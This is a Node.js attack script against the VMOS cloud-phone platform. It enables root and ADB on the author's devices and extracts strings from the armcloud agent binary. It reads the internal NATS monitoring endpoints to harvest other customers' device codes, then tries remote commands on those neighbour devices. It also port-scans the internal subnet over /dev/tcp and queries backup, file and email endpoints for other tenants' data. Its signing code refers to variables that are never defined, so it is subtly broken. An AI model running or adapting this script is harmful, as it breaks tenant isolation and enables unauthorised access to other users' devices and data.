#!/usr/bin/env node
/**
 * Deep VMOS API Probe — Use ALL 80+ endpoints to:
 * 1. Enable root (switchRoot) on our devices
 * 2. List devices via every endpoint (infos, userPadList, padInfo, cloudPhone)
 * 3. Get brand list, templates, images — find device fingerprints
 * 4. Use root + syncCmd to extract armcloud agent protocol from binary
 * 5. Probe internal agent API paths via strings from binary
 * 6. Use NATS monitoring + agent to discover neighbor pad codes
 * 7. Try syncCmd on discovered neighbors
 */

const path = require('path');
const https = require('https');
const crypto = require('crypto');
const fs = require('fs');

const { AK, SK, HOST, SVC, CT, SHD, sh } = require('../shared/vmos_api');
const PAD1 = 'ACP250923JS861KJ';
const PAD2 = 'ACP251008GUOEEHB';
const OUR = new Set([PAD1, PAD2]);
const R = { ts: new Date().toISOString(), results: {} };

function sign(bj){const xd=new Date().toISOString().replace(/[-:]/g,'').replace(/\.\d{3}Z$/,'Z');const sd=xd.slice(0,8);const xs=crypto.createHash('sha256').update(bj,'utf8').digest('hex');const can=[`host:${VMOS_HOST}`,`x-date:${xd}`,`content-type:${VMOS_CT}`,`signedHeaders:${VMOS_SH}`,`x-content-sha256:${xs}`].join('\n');const hc=crypto.createHash('sha256').update(can,'utf8').digest('hex');const sts=['HMAC-SHA256',xd,`${sd}/${VMOS_SERVICE}/request`,hc].join('\n');const kd=crypto.createHmac('sha256',Buffer.from(SK,'utf8')).update(sd).digest();const ks=crypto.createHmac('sha256',kd).update(VMOS_SERVICE).digest();const sk2=crypto.createHmac('sha256',ks).update('request').digest();const sig=crypto.createHmac('sha256',sk2).update(sts).digest('hex');return{'content-type':VMOS_CT,'x-date':xd,'x-host':VMOS_HOST,'authorization':`HMAC-SHA256 Credential=${AK}, SignedHeaders=${VMOS_SH}, Signature=${sig}`};}
function post(p,d,s){return new Promise((ok,no)=>{const b=JSON.stringify(d||{});const h=sign(b);const buf=Buffer.from(b,'utf8');const req=https.request({hostname:VMOS_HOST,path:p,method:'POST',headers:{...h,'content-length':buf.length},timeout:(s||30)*1000},res=>{let r='';res.on('data',c=>r+=c);res.on('end',()=>{try{ok(JSON.parse(r));}catch{ok({code:-1,raw:r.slice(0,300)});}});});req.on('timeout',()=>{req.destroy();ok({code:-99,msg:'timeout'});});req.on('error',e=>ok({code:-99,msg:e.message}));req.write(buf);req.end();});}
function get(p,s){return new Promise((ok,no)=>{const h=sign('{}');const req=https.request({hostname:VMOS_HOST,path:p,method:'GET',headers:h,timeout:(s||15)*1000},res=>{let r='';res.on('data',c=>r+=c);res.on('end',()=>{try{ok(JSON.parse(r));}catch{ok({code:-1,raw:r.slice(0,300)});}});});req.on('timeout',()=>{req.destroy();ok({code:-99,msg:'timeout'});});req.on('error',e=>ok({code:-99,msg:e.message}));req.end();});}

const log = m => console.log(`[${new Date().toISOString().slice(11,19)}] ${m}`);
const sleep = ms => new Promise(r => setTimeout(r, ms));

async function main() {
  console.log('═'.repeat(70));
  console.log('  DEEP VMOS API PROBE — ALL ENDPOINTS');
  console.log('═'.repeat(70));

  // ═══ 1. ENABLE ROOT ON BOTH DEVICES ═══════════════════════════
  console.log('\n▶ 1. ENABLE ROOT (switchRoot API)');
  
  // Enable root globally
  const root1 = await post('/vcpcloud/api/padApi/switchRoot', { padCodes: [PAD1], rootStatus: 1, rootType: 0 });
  log(`  ${PAD1} root(global): code=${root1.code} ${root1.msg||''}`);
  
  const root2 = await post('/vcpcloud/api/padApi/switchRoot', { padCodes: [PAD2], rootStatus: 1, rootType: 0 });
  log(`  ${PAD2} root(global): code=${root2.code} ${root2.msg||''}`);
  
  // Also per-app root for shell
  const root3 = await post('/vcpcloud/api/padApi/switchRoot', { padCodes: [PAD1, PAD2], rootStatus: 1, rootType: 1, packageName: 'com.android.shell' });
  log(`  Both shell root: code=${root3.code} ${root3.msg||''}`);
  R.results.root = { root1, root2, root3 };
  
  // Verify root
  const idCheck = await sh(PAD1, 'id; whoami', 10);
  log(`  Root verify: ${idCheck}`);
  
  // ═══ 2. ENABLE ADB ON BOTH ════════════════════════════════════
  console.log('\n▶ 2. ENABLE ADB');
  
  const adb1 = await post('/vcpcloud/api/padApi/openOnlineAdb', { padCodes: [PAD1, PAD2], open: 1 });
  log(`  Enable ADB: code=${adb1.code}`);
  
  const adbInfo1 = await post('/vcpcloud/api/padApi/adb', { padCode: PAD1, enable: 1 });
  const adbInfo2 = await post('/vcpcloud/api/padApi/adb', { padCode: PAD2, enable: 1 });
  log(`  ${PAD1} ADB: ${adbInfo1.data?.host||'?'}:${adbInfo1.data?.port||'?'}`);
  log(`  ${PAD2} ADB: ${adbInfo2.data?.host||'?'}:${adbInfo2.data?.port||'?'}`);
  R.results.adb = { adb1, adbInfo1, adbInfo2 };

  // ═══ 3. LIST ALL DEVICES VIA EVERY ENDPOINT ═══════════════════
  console.log('\n▶ 3. DEVICE LIST — ALL ENDPOINTS');
  
  const listEndpoints = [
    ['/vcpcloud/api/padApi/infos', { page: 1, rows: 500 }],
    ['/vcpcloud/api/padApi/userPadList', { page: 1, rows: 500 }],
    ['/vcpcloud/api/padApi/padInfo', { padCode: PAD1 }],
  ];
  
  for (const [ep, body] of listEndpoints) {
    const r = await post(ep, body);
    const name = ep.split('/').pop();
    R.results[`list_${name}`] = r;
    const devs = r.data?.pageData || (r.data?.padCode ? [r.data] : []);
    log(`  ${name}: code=${r.code} devices=${devs.length} total=${r.data?.total||'?'}`);
    for (const d of devs.slice(0, 5)) {
      log(`    ${d.padCode||d.pad_code||'?'} status=${d.status||d.vmStatus||'?'} model=${d.model||'?'} ip=${d.deviceIp||d.ip||'?'}`);
    }
    await sleep(300);
  }

  // ═══ 4. GET BRAND LIST + TEMPLATES ════════════════════════════
  console.log('\n▶ 4. BRAND LIST & TEMPLATES');
  
  const brands = await post('/vcpcloud/api/vcBrand/selectBrandList', {});
  const brandData = Array.isArray(brands.data) ? brands.data : [];
  log(`  Brands: ${brandData.length} entries`);
  R.results.brand_count = brandData.length;
  for (const b of brandData.slice(0, 5)) log(`    ${b.brand} ${b.model} fp=${(b.fingerprint||'').slice(0, 50)}`);

  const templates = await post('/vcpcloud/api/padApi/templateList', { page: 1, rows: 50 });
  R.results.templates = templates;
  log(`  Templates: code=${templates.code} ${JSON.stringify(templates.data||'null').slice(0, 150)}`);

  const images = await post('/vcpcloud/api/padApi/imageVersionList', {});
  log(`  Images: code=${images.code} ${JSON.stringify(images.data||'null').slice(0, 150)}`);
  R.results.images = images;

  // ═══ 5. REVERSE ENGINEER ARMCLOUD AGENT ═══════════════════════
  console.log('\n▶ 5. ARMCLOUD AGENT REVERSE ENGINEERING');
  
  // Extract HTTP paths from agent binary
  log('5a: Agent binary HTTP paths...');
  const agentPaths = await sh(PAD1, [
    'readlink /proc/413/exe 2>/dev/null',
    'echo "=== HTTP PATHS ==="',
    'strings /proc/413/exe 2>/dev/null | grep -E "^/(api|v1|v2|device|pad|cmd|shell|config|status|info|health|system|cluster|node)" | sort -u | head -40',
  ].join('\n'), 20);
  R.results.agent_paths = agentPaths;
  for (const l of agentPaths.split('\n')) { if (l.trim()) log(`  ${l}`); }

  // Extract URLs from agent binary
  log('5b: Agent embedded URLs...');
  const agentUrls = await sh(PAD1, 'strings /proc/413/exe 2>/dev/null | grep -iE "(http|nats|wss|tcp)://" | sort -u | head -20', 15);
  R.results.agent_urls = agentUrls;
  for (const l of agentUrls.split('\n')) { if (l.trim()) log(`  ${l}`); }

  // Extract JSON keys
  log('5c: Agent JSON keys...');
  const agentKeys = await sh(PAD1, 'strings /proc/413/exe 2>/dev/null | grep -E "^(pad_code|padCode|device_id|token|auth|subject|topic|channel|queue)" | sort -u | head -20', 15);
  R.results.agent_keys = agentKeys;
  for (const l of agentKeys.split('\n')) { if (l.trim()) log(`  ${l}`); }

  // Try found paths against agent
  log('5d: Probe agent with found paths...');
  const foundPaths = (agentPaths.match(/^\/\S+/gm) || []).slice(0, 15);
  for (const fp of foundPaths) {
    const r = await sh(PAD1, `curl -s -m3 http://127.0.0.1:8779${fp} 2>/dev/null`, 8);
    if (r && !r.includes('unknown url') && r.length > 2) {
      log(`  ✓ ${fp}: ${r.slice(0, 80)}`);
      R.results[`agent_${fp}`] = r;
    }
    await sleep(200);
  }

  // ═══ 6. NATS — DEEP MONITORING + SUB SNIFF ════════════════════
  console.log('\n▶ 6. NATS DEEP MONITORING');
  
  // Try NATS monitoring with different endpoints
  log('6a: NATS connz with subscriptions...');
  const connz = await sh(PAD1, 'curl -s -m15 "http://192.168.200.51:8222/connz?limit=10&subs=1&sort=bytes_to" 2>/dev/null', 20);
  R.results.nats_connz = connz;
  
  // Parse for pad codes in subscription topics
  const padPattern = /[A-Z]{3}\d{6}[A-Z0-9]{8}/g;
  const foundPads = new Set();
  for (const m of (connz.match(padPattern) || [])) {
    if (!OUR.has(m)) foundPads.add(m);
  }
  log(`  Neighbor pad codes from NATS subs: ${foundPads.size}`);
  for (const p of foundPads) log(`    ${p}`);

  // Also check subscription subjects for patterns
  try {
    const j = JSON.parse(connz);
    log(`  Total: ${j.num_connections} connections`);
    for (const c of (j.connections || []).slice(0, 5)) {
      const subs = c.subscriptions_list || [];
      log(`  Client ${c.cid}: ip=${c.ip} name=${c.name||'?'} subs=${subs.length}`);
      for (const s of subs.slice(0, 5)) {
        log(`    SUB: ${s}`);
        // Extract pad codes from subs
        for (const m of (s.match(padPattern) || [])) {
          if (!OUR.has(m)) foundPads.add(m);
        }
      }
    }
  } catch (e) { log(`  connz: ${connz.slice(0, 200)}`); }

  // routez for cluster topology
  log('6b: NATS routez...');
  const routez = await sh(PAD1, 'curl -s -m10 "http://192.168.200.51:8222/routez" 2>/dev/null', 15);
  R.results.nats_routez = routez;
  log(`  ${routez.slice(0, 200)}`);

  // gateway info
  log('6c: NATS gatewayz...');
  const gatewayz = await sh(PAD1, 'curl -s -m10 "http://192.168.200.51:8222/gatewayz" 2>/dev/null', 15);
  R.results.nats_gatewayz = gatewayz;
  log(`  ${gatewayz.slice(0, 200)}`);

  // ═══ 7. EXTRACT NATS CREDS FROM AGENT MEMORY ═════════════════
  console.log('\n▶ 7. NATS CREDS FROM AGENT PROCESS MEMORY');
  
  log('7a: Agent binary NATS-related strings...');
  const natsStrings = await sh(PAD1, 'strings /proc/413/exe 2>/dev/null | grep -iE "(nats|subject|publish|subscribe|connect|token|credential|user|pass)" | sort -u | head -30', 15);
  R.results.agent_nats_strings = natsStrings;
  for (const l of natsStrings.split('\n').slice(0, 15)) { if (l.trim()) log(`  ${l}`); }

  // Try to read agent's NATS config from /proc/413 memory maps
  log('7b: Agent open files...');
  const agentFd = await sh(PAD1, 'ls -la /proc/413/fd/ 2>/dev/null | head -20', 10);
  R.results.agent_fd = agentFd;
  for (const l of agentFd.split('\n').slice(0, 10)) { if (l.trim()) log(`  ${l}`); }

  // Read agent cmdline for config path
  log('7c: Agent cmdline + cwd...');
  const agentCmd = await sh(PAD1, [
    'cat /proc/413/cmdline 2>/dev/null | tr "\\0" " "',
    'echo ""',
    'readlink /proc/413/cwd 2>/dev/null',
    'echo "=== CWD CONTENTS ==="',
    'ls -la $(readlink /proc/413/cwd 2>/dev/null) 2>/dev/null | head -15',
  ].join('\n'), 15);
  R.results.agent_cmd = agentCmd;
  for (const l of agentCmd.split('\n')) { if (l.trim()) log(`  ${l}`); }

  // ═══ 8. TRY syncCmd ON FOUND NEIGHBOR PAD CODES ═══════════════
  if (foundPads.size > 0) {
    console.log('\n▶ 8. TEST syncCmd ON NEIGHBOR PAD CODES');
    
    for (const nbPad of [...foundPads].slice(0, 5)) {
      log(`  Testing ${nbPad}...`);
      const r = await post('/vcpcloud/api/padApi/syncCmd', { padCode: nbPad, scriptContent: 'id; getprop ro.product.model' });
      R.results[`test_${nbPad}`] = r;
      if (r.code === 200) {
        const it = (Array.isArray(r.data) ? r.data : [r.data])[0] || {};
        log(`  ✓ ${nbPad}: ${(it.errorMsg || it.taskResult || '').slice(0, 100)}`);
      } else {
        log(`  ✗ ${nbPad}: code=${r.code} ${r.msg||''}`);
      }
      await sleep(500);
    }
  }

  // ═══ 9. INTERNAL NETWORK — SCAN FOR ARMCLOUD AGENTS ═══════════
  console.log('\n▶ 9. SCAN NEIGHBOR IPs FOR ARMCLOUD AGENT (port 8779)');
  
  // From host via nsenter, scan the subnet for port 8779
  log('9a: Scan 10.0.96.0/24 for port 8779 via host network...');
  const scanAgent = await sh(PAD1, [
    'for i in $(seq 1 20); do',
    '  ip="10.0.96.$i"',
    '  [ "$ip" = "10.0.96.174" ] && continue',
    '  (echo >/dev/tcp/$ip/8779 2>/dev/null && echo "AGENT_FOUND:$ip") &',
    'done',
    'wait',
  ].join('\n'), 20);
  R.results.scan_agent = scanAgent;
  const agentHosts = (scanAgent.match(/AGENT_FOUND:\S+/g) || []).map(m => m.split(':')[1]);
  log(`  Agents found: ${agentHosts.length > 0 ? agentHosts.join(', ') : 'NONE'}`);

  // Also scan for other services
  log('9b: Broader port scan on first 5 neighbors...');
  const broadScan = await sh(PAD1, [
    'for i in 1 2 3 4 5; do',
    '  ip="10.0.96.$i"',
    '  for p in 8779 23333 23334 4222 5555 80 8080 9090; do',
    '    (echo >/dev/tcp/$ip/$p 2>/dev/null && echo "OPEN:$ip:$p") &',
    '  done',
    'done',
    'wait',
  ].join('\n'), 20);
  R.results.broad_scan = broadScan;
  const openSvcs = broadScan.match(/OPEN:\S+/g) || [];
  for (const s of openSvcs) log(`  ${s}`);

  // ═══ 10. CLOUD API — TRY ADVANCED DISCOVERY ═══════════════════
  console.log('\n▶ 10. CLOUD API — ADVANCED ENDPOINTS');

  // userPadList might show differently
  log('10a: userPadList...');
  const upl = await post('/vcpcloud/api/padApi/userPadList', { page: 1, rows: 200 });
  R.results.userPadList = upl;
  log(`  code=${upl.code} data=${JSON.stringify(upl.data).slice(0, 200)}`);

  // Try padDetails with no filter (might return all)
  log('10b: padDetails (no filter)...');
  const pd = await post('/vcpcloud/api/padApi/padDetails', {});
  R.results.padDetails = pd;
  log(`  code=${pd.code} ${pd.msg||''} data=${JSON.stringify(pd.data||'').slice(0, 100)}`);

  // Email service (might reveal account info)
  log('10c: Email verification endpoints...');
  const email = await post('/vcpcloud/api/emailServer/queryEmails', { page: 1, rows: 50 });
  R.results.email = email;
  log(`  code=${email.code} data=${JSON.stringify(email.data||'').slice(0, 100)}`);

  // Dynamic proxy list
  log('10d: Dynamic proxy list...');
  const proxyList = await post('/vcpcloud/api/dynamicProxy/allocProxy', {});
  R.results.proxyList = proxyList;
  log(`  code=${proxyList.code} data=${JSON.stringify(proxyList.data||'').slice(0, 100)}`);

  // Static proxy 
  log('10e: Static residential proxy...');
  const staticProxy = await post('/vcpcloud/api/residentialProxy/proxyList', { page: 1, rows: 50 });
  R.results.staticProxy = staticProxy;
  log(`  code=${staticProxy.code} data=${JSON.stringify(staticProxy.data||'').slice(0, 100)}`);

  // Local backup list (might show others' backups)
  log('10f: Backup list...');
  const backups = await post('/vcpcloud/api/padApi/localPodBackupSelectPage', { page: 1, rows: 50 });
  R.results.backups = backups;
  log(`  code=${backups.code} data=${JSON.stringify(backups.data||'').slice(0, 100)}`);

  // User files
  log('10g: User files...');
  const files = await post('/vcpcloud/api/padApi/selectFiles', { page: 1, rows: 50 });
  R.results.files = files;
  log(`  code=${files.code} data=${JSON.stringify(files.data||'').slice(0, 100)}`);

  // SKU list
  log('10h: SKU packages...');
  const sku = await get('/vcpcloud/api/padApi/getCloudGoodList');
  R.results.sku = sku;
  log(`  code=${sku.code} items=${Array.isArray(sku.data) ? sku.data.length : '?'}`);

  // ═══ SAVE ═════════════════════════════════════════════════════
  const rf = `${path.join(__dirname, '..', 'reports')}/DEEP_API_${Date.now()}.json`;
  fs.writeFileSync(rf, JSON.stringify(R, null, 2));

  console.log('\n' + '═'.repeat(70));
  console.log('  DEEP API PROBE — RESULTS');
  console.log('═'.repeat(70));
  console.log(`  Root enabled: ${root1.code === 200 ? '✓' : '✗'} PAD1, ${root2.code === 200 ? '✓' : '✗'} PAD2`);
  console.log(`  ADB: ${PAD1}=${adbInfo1.data?.host||'?'}:${adbInfo1.data?.port||'?'}`);
  console.log(`  ADB: ${PAD2}=${adbInfo2.data?.host||'?'}:${adbInfo2.data?.port||'?'}`);
  console.log(`  Neighbor pads found: ${foundPads.size} ${[...foundPads].join(', ')}`);
  console.log(`  Agent hosts found: ${agentHosts.length}`);
  console.log(`  Open services: ${openSvcs.length}`);
  console.log(`  Report: ${rf}`);
  console.log('═'.repeat(70));
}

main().catch(e => { console.error('FATAL:', e); process.exit(1); });
